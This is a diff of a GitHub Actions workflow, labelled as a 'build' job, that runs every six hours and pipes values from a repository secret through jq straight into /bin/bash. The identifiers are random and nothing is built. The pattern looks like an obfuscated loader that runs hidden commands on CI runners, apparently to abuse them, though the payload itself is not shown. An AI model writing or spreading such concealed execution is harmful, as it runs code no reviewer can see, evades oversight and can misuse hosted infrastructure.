@@ -1,8 +1,10 @@
 name: huchunyan3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
+    - cron: '4 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,22 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: huchunyan3456
         env:
-          q41: ${{ secrets.q41 }}
+          gg939: ${{ secrets.gg939 }}
         run: |
-          echo $q41 | jq -r .kqzk471 | /bin/bash
-          echo $l50 | jq -r .kpkty358 | /bin/bash
-          echo $feis4 | jq -r .u6465 | /bin/bash
-          echo $daiv72912 | jq -r .j542 | /bin/bash
-          echo $klp4362 | jq -r .bwq8614 | /bin/bash
-          echo $bmdy69 | jq -r .i2672 | /bin/bash
-          echo $onx18 | jq -r .jyuyf36 | /bin/bash
-          echo $ykl866 | jq -r .eq1857 | /bin/bash
-          echo $bi282 | jq -r .uz75174 | /bin/bash
-          echo $ozs224 | jq -r .gyg50 | /bin/bash
-          echo $zrcd34837 | jq -r .bauid397 | /bin/bash
-          echo $tlgj683 | jq -r .cfmf7 | /bin/bash
-          echo $ane318 | jq -r .jnut6 | /bin/bash
-          echo $vg05246 | jq -r .gzswc616 | /bin/bash
-          echo $u45 | jq -r .kqgz36076 | /bin/bash
-          echo $vp03302 | jq -r .wtx278 | /bin/bash
+          echo $gg939 | jq -r .x4908 | /bin/bash
+          echo $x01071 | jq -r .vel06 | /bin/bash
+          echo $qbkq6696 | jq -r .qgrjb909 | /bin/bash
+          echo $tkdul24593 | jq -r .my76768 | /bin/bash
+          echo $bbb6733 | jq -r .pkmki371 | /bin/bash
+          echo $o39315 | jq -r .pyg82712 | /bin/bash
+          echo $vvphi9 | jq -r .hokdt0548 | /bin/bash
 
